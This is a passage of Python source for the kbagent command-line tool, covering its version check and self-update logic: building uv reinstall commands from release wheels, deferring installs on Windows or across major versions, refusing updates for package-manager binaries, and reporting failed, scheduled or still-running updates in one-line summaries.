            kbagent_upgrade_cmd = build_kbagent_upgrade_command(
                target_version=kbagent_target_version,
                wheel_url=kbagent_wheel_url,
            )
            kbagent_upgrade_str = (
                " ".join(kbagent_upgrade_cmd)
                if kbagent_upgrade_cmd is not None
                else _recovery_command(None, kbagent_target_version) or ""
            )
        kbagent_entry: dict[str, Any] = {
            "version": __version__,
            "latest_version": kbagent_latest,
            "up_to_date": kbagent_up_to_date,
            "upgrade_command": kbagent_upgrade_str,
        }
        # Additive keys, present ONLY on a frozen build, so the JSON shape every
        # existing uv/pip consumer sees stays byte-identical. `upgrade_hint` is
        # always a human sentence; `upgrade_command` is empty when the channel
        # has no single runnable command.
        if frozen_distribution is not None:
            kbagent_entry["install_channel"] = frozen_distribution.channel.value
            kbagent_entry["upgrade_hint"] = frozen_distribution.upgrade_hint
        return {"kbagent": kbagent_entry}

    def self_update(
        self, *, include_prerelease: bool = False, allow_major: bool = False
    ) -> dict[str, Any]:
        """Update kbagent to the latest version.

        Uses ``uv tool install --force --reinstall`` from an exact release
        wheel or Git tag. If the installed kbagent is already at the latest
        version, the update reports ``updated=False`` without running a
        subprocess.

        Args:
            include_prerelease: When True (driven by ``kbagent update --beta``
                or ``KBAGENT_INCLUDE_PRERELEASE=1``), the version lookup
                considers pre-release (beta / rc) releases and the install
                command opts into resolver-level pre-release acceptance.
            allow_major: ``kbagent update --major``: install the next major
                before its migration date. Without it the update stays on the
                running major until that date (#791 UP1); ``--beta`` alone
                never crosses a major.

        Returns:
            Dict with the update result::

                {
                    "kbagent": {"updated": bool, "current_version": str,
                                "latest_version": str|None, "message": str,
                                "output": str|None,
                                # Both below distinguish "not updated YET" from
                                # "failed" -- neither is an error:
                                "deferred": bool,      # handed to the helper
                                "still_running": bool},  # outran the wait
                    "updated": bool,    # True iff kbagent upgraded
                    "message": str,     # Human-readable single-line summary
                }
        """
        plan = prepare_update_plan(include_prerelease=include_prerelease, allow_major=allow_major)
        if plan.gated is not None and not plan.kbagent.crosses_major:
            _register_notice(plan.gated)
        kbagent_result = self._update_kbagent(plan.kbagent)

        return {
            "kbagent": kbagent_result,
            "updated": bool(kbagent_result.get("updated")),
            "message": self._compose_update_summary(kbagent_result),
        }

    @staticmethod
    def _summarize_failure_tail(message: str | None) -> str:
        """Compress a multi-line failure message to its last non-empty line.

        Subprocess failures embed the whole uv/pip transcript; the actionable
        line (e.g. ``error: Executable already exists: kbagent``) is last. We
        surface only that tail in the one-line summary -- the full transcript
        stays in the result's ``output`` for ``--json`` / ``--verbose``.
        """
        return summarize_install_failure(message) or "update failed"

    @classmethod
    def _compose_update_summary(cls, kbagent_result: dict[str, Any]) -> str:
        """Build a one-line summary of the update result.

        A non-upgraded result is only "already up to date" when it explicitly
        reports ``up_to_date``. Any other ``updated=False`` means the upgrade
        was ATTEMPTED and FAILED -- surface it instead of masking it as
        success (the silent-failure bug behind the #424 rename: a failed
        self-update was reported as "already up to date").
        """
        parts: list[str] = []
        if kbagent_result.get("updated"):
            parts.append(
                f"kbagent v{kbagent_result.get('current_version')}"
                f" -> v{kbagent_result.get('latest_version')}"
            )
        elif kbagent_result.get("deferred"):
            # Scheduled, not failed: the install runs once this process exits.
            parts.append(
                f"kbagent v{kbagent_result.get('current_version')}"
                f" -> v{kbagent_result.get('latest_version')} (scheduled)"
            )
        elif kbagent_result.get("still_running"):
            # Outran our patience, not our expectations -- it was never killed.
            parts.append(
                f"kbagent v{kbagent_result.get('current_version')}"
                f" -> v{kbagent_result.get('latest_version')} (still installing)"
            )
        elif kbagent_result.get("up_to_date"):
            parts.append(f"kbagent v{kbagent_result.get('current_version')} (already up to date)")
        elif kbagent_result.get("install_channel"):
            # Frozen native binary -- behind, but NOT a failed update: we never
            # attempted one. Must precede the failure branch below, which would
            # otherwise report this deliberate refusal as "update FAILED".
            channel = kbagent_result.get("install_channel")
            action = kbagent_result.get("upgrade_command") or "see the release page"
            latest = kbagent_result.get("latest_version")
            # `latest` is None when the release lookup failed (offline). The
            # refusal is still worth reporting -- the user asked for an update
            # and got none -- but "-> vNone available" is not.
            target = f" -> v{latest} available" if latest else " (latest version unknown)"
            parts.append(
                f"kbagent v{kbagent_result.get('current_version')}{target} "
                f"(standalone {channel} binary; {action})"
            )
        elif kbagent_result.get("current_version"):
            tail = cls._summarize_failure_tail(kbagent_result.get("message"))
            parts.append(f"kbagent v{kbagent_result.get('current_version')} update FAILED: {tail}")

        if not parts:
            return "Nothing to update."
        return " | ".join(parts)

    @staticmethod
    def _update_kbagent(plan: KbagentUpdatePlan) -> dict[str, Any]:
        """Apply a precomputed terminal self-reinstall without new probes.

        Where the reinstall runs is platform-dependent (issue #528). On Windows
        an in-place ``uv tool install`` deletes the very environment this
        process is executing from, cannot finish, and leaves it gutted -- so the
        install is handed to a detached helper that waits for kbagent to exit.
        POSIX keeps the inline install, which is safe because unlinking an open
        file leaves the running process's inode intact.
        """
        old_version = plan.current_version
        kbagent_latest = plan.latest_version
        up_to_date = plan.up_to_date

        if up_to_date is True:
            return {
                "planned": True,
                "updated": False,
                "up_to_date": True,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "message": f"kbagent v{old_version} is already up to date.",
            }

        # Frozen binary: refuse the self-update and name the real channel. This
        # MUST precede BOTH branches below. The `command is None` branch would
        # tell the user to run `uv tool install --force --reinstall`, and the
        # deferred-helper branch after it is equally inapplicable -- neither can
        # upgrade a Chocolatey / Homebrew / apt / dnf install, they just create a
        # second, unrelated kbagent that shadows theirs on PATH.
        if plan.frozen_distribution is not None:
            frozen = plan.frozen_distribution
            return {
                "planned": True,
                "updated": False,
                "up_to_date": up_to_date,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "install_channel": frozen.channel.value,
                "upgrade_command": frozen.upgrade_command,
                "message": (
                    f"kbagent v{old_version} is a standalone binary installed via "
                    f"{frozen.channel.value}; it cannot update itself -- "
                    f"{frozen.upgrade_hint}"
                ),
            }

        # Two very different situations reach `command is None`, and reporting
        # them identically sent users chasing the wrong thing: not knowing what
        # to install is usually a transient network or GitHub rate-limit blip,
        # while knowing the version but failing to build a command is a real
        # local problem. Separate them, and never print a recovery command that
        # is not runnable -- the old fallback rendered as a bare
        # `uv tool install --force --reinstall` with no package to install.
        if kbagent_latest is None and plan.same_major_missing:
            major = _major_of(old_version)
            return {
                "planned": False,
                "updated": False,
                "up_to_date": up_to_date,
                "current_version": old_version,
                "latest_version": None,
                "reason": "same_major_not_found",
                "message": (
                    f"No kbagent {major}.x release is among the newest "
                    f"{RELEASE_LIST_PAGE_SIZE * RELEASE_LIST_MAX_PAGES} GitHub releases, so "
                    f"v{old_version} was left untouched. Run `kbagent update --major` to move "
                    f"to {major + 1}.x."
                ),
            }
        if kbagent_latest is None:
            return {
                "planned": False,
                "updated": False,
                "up_to_date": up_to_date,
                "current_version": old_version,
                "latest_version": None,
                "reason": "latest_version_unknown",
                "message": (
                    f"Could not determine the latest kbagent version, so v{old_version} "
                    "was left untouched. This is usually temporary -- no network, or "
                    "GitHub's unauthenticated API rate limit (60 requests/hour per IP, "
                    "shared by every tool on your connection). Try again in a few minutes."
                ),
            }

        if plan.command is None:
            return {
                "planned": True,
                "updated": False,
                "up_to_date": up_to_date,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "message": (
                    f"Could not prepare a self-update command for v{kbagent_latest}. "
                    f"Recover with: {plan.recovery_command}"
                    if plan.recovery_command
                    else (
                        f"Could not prepare a self-update command for v{kbagent_latest}. "
                        "Reinstall kbagent from the release wheel for that version: "
                        f"https://github.com/{KBAGENT_GITHUB_REPO}/releases/tag/v{kbagent_latest}"
                    )
                ),
                "recovery_command": plan.recovery_command,
            }

        # A major crossing is deferred on every OS (#791 UP2): this command
        # finishes on the old major, and a running `kbagent serve` holds the
        # install until it stops (the helper gives up after 15 minutes).
        if should_defer() or plan.crosses_major:
            pending = pending_update_target()
            if pending is not None and pending != kbagent_latest:
                return {
                    "planned": True,
                    "updated": False,
                    "deferred": False,
                    "up_to_date": False,
                    "current_version": old_version,
                    "latest_version": kbagent_latest,
                    "reason": "other_update_pending",
                    "message": (
                        f"An update to v{pending} is already scheduled and runs once every "
                        f"kbagent process has exited. v{kbagent_latest} was not scheduled; run "
                        "this command again after that update has finished."
                    ),
                    "recovery_command": plan.recovery_command,
                }
            scheduled = request_deferred_update(
                DeferredUpdateRequest(
                    from_version=old_version,
                    target_version=kbagent_latest or old_version,
                    install_command=plan.command,
                    recovery_command=plan.recovery_command,
                    hardlink_retry_command=build_hardlink_retry_command(plan.command),
                    major_flag=plan.major_flag,
                )
            )
            if scheduled:
                why = (
                    "a new major version is installed only after this command"
                    if plan.crosses_major
                    else "replacing the environment while it is in use is what corrupts it on "
                    "Windows"
                )
                return {
                    "planned": True,
                    "updated": False,
                    "deferred": True,
                    "up_to_date": False,
                    "current_version": old_version,
                    "latest_version": kbagent_latest,
                    "message": (
                        f"kbagent v{kbagent_latest} will be installed as soon as every kbagent "
                        f"process has exited -- {why}. Close other kbagent processes (a running "
                        "kbagent serve too); the result is reported on the next launch."
                    ),
                    "recovery_command": plan.recovery_command,
                }
            # No helper could be spawned. Running the install here anyway is the
            # exact corruption this branch exists to avoid, so hand the user the
            # command instead of taking the risk on their behalf.
            return {
                "planned": True,
                "updated": False,
                "deferred": False,
                "up_to_date": False,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "message": (
                    "Update could not be scheduled safely while kbagent is running. "
                    f"Install it from a shell with no kbagent running: {plan.recovery_command}"
                ),
                "recovery_command": plan.recovery_command,
            }

        run = run_install(plan.command, timeout=get_update_timeout())
        if run.status is InstallStatus.SUCCEEDED:
            return {
                "planned": True,
                "updated": True,
                "up_to_date": False,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "message": f"Updated kbagent from v{old_version} to v{kbagent_latest}. "
                "Restart your shell to use the new version.",
                "output": run.output,
            }
        if run.status is InstallStatus.STILL_RUNNING:
            # Not killed, still installing -- offering a recovery command here
            # would invite a second installer into the same environment. The
            # explicit flag keeps the summary from calling this a failure.
            timeout_s = int(get_update_timeout())
            return {
                "planned": True,
                "updated": False,
                "still_running": True,
                "up_to_date": False,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "message": (
                    f"Update still running after {timeout_s}s; it continues in the background "
                    f"and applies on the next launch. Log: {run.log_path}"
                ),
                "output": run.output,
            }
        return {
            "planned": True,
            "updated": False,
            "up_to_date": False,
            "current_version": old_version,
            "latest_version": kbagent_latest,
            "message": f"Update failed: {run.output}",
            "output": run.output,
            "recovery_command": plan.recovery_command,
        }
